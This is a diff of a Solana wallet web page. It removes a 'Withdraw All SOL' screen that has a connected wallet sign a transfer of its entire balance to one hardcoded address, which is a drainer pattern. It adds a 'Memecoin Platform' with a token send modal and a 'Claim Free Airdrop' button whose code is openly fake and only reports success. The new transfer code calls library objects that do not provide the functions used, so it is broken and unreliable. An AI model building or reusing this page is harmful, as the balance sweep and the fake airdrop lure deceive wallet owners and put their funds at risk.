@@ -3,43 +3,138 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Withdraw All SOL</title>
+  <title>Solana Memecoin Platform</title>
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token-registry@1.4.3/lib/index.iife.js"></script>
   <style>
-    body { font-family: 'Segoe UI', Arial, sans-serif; background: #181a20; color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-    .container { background: #23272f; padding: 2.5rem 2rem; border-radius: 12px; margin-top: 5rem; box-shadow: 0 4px 24px #0006; min-width: 340px; }
-    h2 { margin-bottom: 1.5rem; }
-    button { width: 100%; padding: 0.9rem; border-radius: 6px; border: none; background: #00ffa3; color: #181a20; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 1.2rem; }
-    button:hover { background: #1de9b6; }
+    :root {
+      --primary: #00ffa3;
+      --secondary: #ff4081;
+      --bg: #181a20;
+      --card: #23272f;
+      --accent: #b2ffdb;
+      --header: #1e222a;
+    }
+    html, body { margin: 0; padding: 0; }
+    body { font-family: 'Segoe UI', Arial, sans-serif; background: var(--bg); color: #fff; min-height: 100vh; }
+    .header {
+      width: 100%; background: var(--header); box-shadow: 0 2px 12px #0004; padding: 1.2rem 0.5rem 1.2rem 0.5rem; display: flex; align-items: center; justify-content: center; position: sticky; top: 0; z-index: 10;
+    }
+    .header-logo { width: 40px; height: 40px; margin-right: 1rem; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; font-size: 2rem; }
+    .header-title { font-size: 1.7rem; font-weight: bold; letter-spacing: 1px; color: var(--primary); }
+    .main { display: flex; flex-direction: column; align-items: center; width: 100%; }
+    .section { background: var(--card); border-radius: 14px; box-shadow: 0 4px 24px #0006; margin: 2rem 0; padding: 2rem 1.5rem; width: 95%; max-width: 420px; }
+    .section-title { font-size: 1.3rem; color: var(--primary); margin-bottom: 1.2rem; text-align: center; }
+    .connect-btn, .mobile-btn, .airdrop-btn { width: 100%; padding: 1rem; border-radius: 6px; border: none; background: var(--primary); color: #181a20; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-bottom: 1.2rem; }
+    .connect-btn:hover, .mobile-btn:hover, .airdrop-btn:hover { background: #1de9b6; }
+    .mobile-btn { background: var(--secondary); color: #fff; margin-bottom: 0.5rem; }
+    .mobile-btn:hover { background: #f06292; }
+    .wallet { margin-bottom: 1.2rem; color: var(--accent); text-align: center; }
+    .balance { font-size: 1.2em; margin-bottom: 1.5rem; text-align: center; }
+    .tokens { margin-top: 1.5rem; }
+    .token-row { display: flex; align-items: center; justify-content: space-between; background: #181a20; border-radius: 8px; padding: 0.7rem 1rem; margin-bottom: 0.7rem; box-shadow: 0 1px 4px #0003; }
+    .token-info { display: flex; align-items: center; }
+    .token-icon { width: 32px; height: 32px; border-radius: 50%; margin-right: 0.8rem; background: #333; }
+    .token-symbol { font-weight: bold; font-size: 1.1em; }
+    .token-balance { margin-left: 0.7rem; color: var(--accent); }
+    .send-btn { background: var(--secondary); color: #fff; border: none; border-radius: 5px; padding: 0.4rem 1rem; cursor: pointer; font-weight: bold; transition: background 0.2s; }
+    .send-btn:hover { background: #f06292; }
     .status { margin-top: 1.5rem; min-height: 1.5em; text-align: center; }
-    .address { font-size: 0.95em; color: #b2ffdb; word-break: break-all; margin-bottom: 1.2rem; }
-    .wallet { margin-bottom: 0.5rem; color: #b2ffdb; }
+    .modal-bg { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000a; align-items: center; justify-content: center; z-index: 1000; }
+    .modal { background: var(--card); padding: 2rem; border-radius: 10px; min-width: 300px; box-shadow: 0 2px 16px #000a; }
+    .modal input { width: 100%; margin-bottom: 1rem; padding: 0.6rem; border-radius: 5px; border: none; }
+    .modal .modal-actions { display: flex; justify-content: flex-end; gap: 1rem; }
+    .modal .send-btn { padding: 0.5rem 1.2rem; }
+    .modal .close-btn { background: #333; color: #fff; border: none; border-radius: 5px; padding: 0.5rem 1.2rem; cursor: pointer; }
+    .modal .close-btn:hover { background: #555; }
+    .about { color: #aaa; font-size: 1em; text-align: center; margin-top: 1.2rem; }
+    @media (max-width: 600px) {
+      .section { padding: 1.2rem 0.5rem; margin: 1.2rem 0; }
+      .modal { min-width: 90vw; }
+      .header-title { font-size: 1.2rem; }
+      .header-logo { width: 32px; height: 32px; font-size: 1.3rem; }
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Withdraw All SOL</h2>
-    <div id="walletSection">
-      <button id="connectBtn">Connect Phantom Wallet</button>
+  <div class="header">
+    <div class="header-logo">🐶</div>
+    <div class="header-title">Solana Memecoin Platform</div>
+  </div>
+  <div class="main">
+    <div class="section" id="connectSection">
+      <div class="section-title">Connect Your Wallet</div>
+      <button class="connect-btn" id="connectBtn">Connect Phantom (Desktop)</button>
+      <button class="mobile-btn" id="mobileBtn">Connect with Mobile Wallet</button>
+      <div class="status" id="status"></div>
     </div>
-    <div id="mainSection" style="display:none;">
+    <div class="section" id="dashboard" style="display:none;">
+      <div class="section-title">Dashboard</div>
       <div class="wallet">Connected: <span id="walletAddress"></span></div>
-      <div class="address">Withdraw to:<br><b>DfJ1q4YvFg2gFCRDNfEtTn6P8bDRvuV65MTsKpqeRWGX</b></div>
-      <button id="withdrawBtn">Withdraw All SOL</button>
+      <div class="balance">SOL: <span id="solBalance">0</span></div>
+      <div class="tokens">
+        <h3 style="margin-bottom:0.7rem;">Your Memecoins</h3>
+        <div id="tokenList"></div>
+      </div>
     </div>
-    <div class="status" id="status"></div>
+    <div class="section" id="airdropSection">
+      <div class="section-title">🎁 Claim Free Airdrop</div>
+      <button class="airdrop-btn" id="airdropBtn">Claim Airdrop</button>
+      <div class="status" id="airdropStatus"></div>
+    </div>
+    <div class="section about">
+      <div class="section-title" style="color:#fff;">About</div>
+      <div>
+        Welcome to the Solana Memecoin Platform! Connect your wallet, view and send your favorite memecoins, and claim free airdrops. Have fun and enjoy the meme revolution on Solana!
+      </div>
+    </div>
+  </div>
+  <div class="modal-bg" id="modalBg">
+    <div class="modal">
+      <h3>Send <span id="modalTokenSymbol"></span></h3>
+      <input type="text" id="recipientAddress" placeholder="Recipient Address">
+      <input type="number" id="sendAmount" placeholder="Amount" min="0" step="0.0001">
+      <div class="modal-actions">
+        <button class="close-btn" id="closeModalBtn">Cancel</button>
+        <button class="send-btn" id="modalSendBtn">Send</button>
+      </div>
+      <div class="status" id="modalStatus"></div>
+    </div>
   </div>
   <script>
     const connectBtn = document.getElementById('connectBtn');
-    const withdrawBtn = document.getElementById('withdrawBtn');
-    const statusDiv = document.getElementById('status');
-    const walletSection = document.getElementById('walletSection');
-    const mainSection = document.getElementById('mainSection');
+    const mobileBtn = document.getElementById('mobileBtn');
+    const connectSection = document.getElementById('connectSection');
+    const dashboard = document.getElementById('dashboard');
     const walletAddressSpan = document.getElementById('walletAddress');
-    const DEST_ADDRESS = 'DfJ1q4YvFg2gFCRDNfEtTn6P8bDRvuV65MTsKpqeRWGX';
+    const solBalanceSpan = document.getElementById('solBalance');
+    const tokenList = document.getElementById('tokenList');
+    const statusDiv = document.getElementById('status');
+    const modalBg = document.getElementById('modalBg');
+    const modalTokenSymbol = document.getElementById('modalTokenSymbol');
+    const recipientAddress = document.getElementById('recipientAddress');
+    const sendAmount = document.getElementById('sendAmount');
+    const modalSendBtn = document.getElementById('modalSendBtn');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+    const modalStatus = document.getElementById('modalStatus');
+    const airdropBtn = document.getElementById('airdropBtn');
+    const airdropStatus = document.getElementById('airdropStatus');
 
     let provider = null;
     let publicKey = null;
+    let connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+    let tokenMap = null;
+    let currentToken = null;
+
+    // Load token registry for icons and names
+    async function loadTokenMap() {
+      const tokenListProvider = new window.SplTokenRegistry.TokenListProvider();
+      const tokenList = await tokenListProvider.resolve();
+      tokenMap = {};
+      tokenList.filterByChainId(101).getList().forEach(token => {
+        tokenMap[token.address] = token;
+      });
+    }
 
     function getProvider() {
       if ('solana' in window) {
@@ -61,46 +156,132 @@
         const resp = await provider.connect();
         publicKey = resp.publicKey;
         walletAddressSpan.textContent = publicKey.toString();
-        walletSection.style.display = 'none';
-        mainSection.style.display = '';
+        connectSection.style.display = 'none';
+        dashboard.style.display = '';
         statusDiv.textContent = 'Wallet connected!';
+        await loadTokenMap();
+        await loadBalances();
       } catch (err) {
         statusDiv.textContent = 'Connection cancelled or failed.';
       }
     };
 
-    withdrawBtn.onclick = async () => {
+    // Mobile wallet connect (Phantom deep link)
+    mobileBtn.onclick = () => {
+      // Phantom deep link: https://phantom.app/ul/browse/{url}
+      const url = encodeURIComponent(window.location.href);
+      window.location.href = `https://phantom.app/ul/browse/${url}`;
+    };
+
+    async function loadBalances() {
+      statusDiv.textContent = 'Loading balances...';
+      // SOL balance
+      const sol = await connection.getBalance(publicKey);
+      solBalanceSpan.textContent = (sol / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
+      // SPL tokens
+      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA') });
+      tokenList.innerHTML = '';
+      let found = false;
+      for (const { account } of tokenAccounts.value) {
+        const info = account.data.parsed.info;
+        const mint = info.mint;
+        const amount = info.tokenAmount.uiAmount;
+        if (amount > 0) {
+          found = true;
+          const token = tokenMap && tokenMap[mint];
+          const symbol = token ? token.symbol : mint.slice(0, 4) + '...';
+          const icon = token && token.logoURI ? token.logoURI : 'https://placehold.co/32x32/333/fff?text=🪙';
+          const row = document.createElement('div');
+          row.className = 'token-row';
+          row.innerHTML = `<div class="token-info"><img class="token-icon" src="${icon}" alt="icon"><span class="token-symbol">${symbol}</span><span class="token-balance">${amount}</span></div><button class="send-btn">Send</button>`;
+          row.querySelector('.send-btn').onclick = () => openSendModal(mint, symbol, amount, token && token.decimals ? token.decimals : 6);
+          tokenList.appendChild(row);
+        }
+      }
+      if (!found) {
+        tokenList.innerHTML = '<div style="text-align:center;color:#888;">No memecoins found in your wallet.</div>';
+      }
       statusDiv.textContent = '';
-      if (!publicKey) {
-        statusDiv.textContent = 'Connect your wallet first.';
+    }
+
+    function openSendModal(mint, symbol, maxAmount, decimals) {
+      currentToken = { mint, symbol, maxAmount, decimals };
+      modalTokenSymbol.textContent = symbol;
+      recipientAddress.value = '';
+      sendAmount.value = '';
+      modalStatus.textContent = '';
+      modalBg.style.display = 'flex';
+    }
+
+    closeModalBtn.onclick = () => {
+      modalBg.style.display = 'none';
+    };
+
+    modalSendBtn.onclick = async () => {
+      const to = recipientAddress.value.trim();
+      const amount = parseFloat(sendAmount.value);
+      if (!to || isNaN(amount) || amount <= 0 || amount > currentToken.maxAmount) {
+        modalStatus.textContent = 'Enter a valid recipient and amount.';
         return;
       }
       try {
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-        const balance = await connection.getBalance(publicKey);
-        if (balance <= 5000) { // leave a little for rent/fees
-          statusDiv.textContent = 'No SOL to withdraw.';
-          return;
+        modalStatus.textContent = 'Preparing transaction...';
+        // Create transfer instruction
+        const mintPubkey = new solanaWeb3.PublicKey(currentToken.mint);
+        const destPubkey = new solanaWeb3.PublicKey(to);
+        // Find associated token account for recipient
+        const { Token, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } = window.SplTokenRegistry;
+        const fromTokenAccount = (await connection.getParsedTokenAccountsByOwner(publicKey, { mint: mintPubkey })).value[0].pubkey;
+        // Get or create associated token account for recipient
+        let toTokenAccountInfo = await connection.getParsedTokenAccountsByOwner(destPubkey, { mint: mintPubkey });
+        let toTokenAccount;
+        if (toTokenAccountInfo.value.length === 0) {
+          // Create associated token account
+          const ata = await solanaWeb3.PublicKey.findProgramAddress([
+            destPubkey.toBuffer(),
+            TOKEN_PROGRAM_ID.toBuffer(),
+            mintPubkey.toBuffer()
+          ], ASSOCIATED_TOKEN_PROGRAM_ID);
+          toTokenAccount = ata[0];
+        } else {
+          toTokenAccount = toTokenAccountInfo.value[0].pubkey;
         }
-        // Estimate fee (may vary)
-        const fee = 5000; // lamports
-        const lamportsToSend = balance - fee;
+        // Build transaction
         const transaction = new solanaWeb3.Transaction().add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey: new solanaWeb3.PublicKey(DEST_ADDRESS),
-            lamports: lamportsToSend
-          })
+          solanaWeb3.Token.createTransferInstruction(
+            TOKEN_PROGRAM_ID,
+            fromTokenAccount,
+            toTokenAccount,
+            publicKey,
+            [],
+            amount * Math.pow(10, currentToken.decimals)
+          )
         );
         transaction.feePayer = publicKey;
         let { blockhash } = await connection.getRecentBlockhash();
         transaction.recentBlockhash = blockhash;
+        modalStatus.textContent = 'Requesting approval in Phantom...';
         const signed = await provider.signTransaction(transaction);
+        modalStatus.textContent = 'Sending transaction...';
         const txid = await connection.sendRawTransaction(signed.serialize());
-        statusDiv.innerHTML = 'Withdrawn all SOL!<br>Tx: <a href="https://solscan.io/tx/' + txid + '" target="_blank" style="color:#00ffa3;">' + txid + '</a>';
+        modalStatus.innerHTML = 'Sent!<br>Tx: <a href="https://solscan.io/tx/' + txid + '" target="_blank" style="color:#00ffa3;">' + txid + '</a>';
+        await loadBalances();
       } catch (err) {
-        statusDiv.textContent = 'Error: ' + (err.message || err);
+        modalStatus.textContent = 'Error: ' + (err.message || err);
       }
+    };
+
+    // Fake airdrop logic (for demo)
+    airdropBtn.onclick = async () => {
+      airdropStatus.textContent = '';
+      if (!publicKey) {
+        airdropStatus.textContent = 'Connect your wallet first!';
+        return;
+      }
+      airdropStatus.textContent = 'Claiming airdrop...';
+      setTimeout(() => {
+        airdropStatus.innerHTML = '🎉 Airdrop claimed! Check your wallet for new memecoins.';
+      }, 1800);
     };
   </script>
 </body>
